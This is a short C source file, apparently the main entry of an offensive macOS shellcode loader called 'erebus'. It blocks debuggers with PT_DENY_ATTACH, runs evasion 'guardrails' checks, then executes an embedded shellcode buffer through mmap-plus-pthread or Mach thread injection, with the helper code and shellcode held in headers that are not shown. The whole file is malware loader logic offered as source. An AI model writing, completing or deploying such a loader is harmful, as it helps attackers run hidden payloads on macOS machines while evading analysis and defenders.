#include <stddef.h>
#include "../include/config.h"
#include "../include/shellcode.h"
#include "../include/evasion.h"
#include "../include/injection.h"

__attribute__((visibility("hidden")))
static void _erebus_run(void)
{
    /* PT_DENY_ATTACH fires immediately - before any other check. */
#if CONFIG_GUARDRAILS_ENABLED && CONFIG_DENY_ATTACH
    erebus_deny_attach();
#endif

#if CONFIG_GUARDRAILS_ENABLED
    if (!erebus_guardrails_check())
        return;
#endif

    const unsigned char *sc  = shellcode;
    const size_t         len = sizeof(shellcode);

#if   CONFIG_INJECTION_TYPE == 1
    erebus_mmap_pthread(sc, len);
#elif CONFIG_INJECTION_TYPE == 2
    erebus_mach_thread(sc, len);
#endif
}

int main(void)
{
    _erebus_run();
    return 0;
}
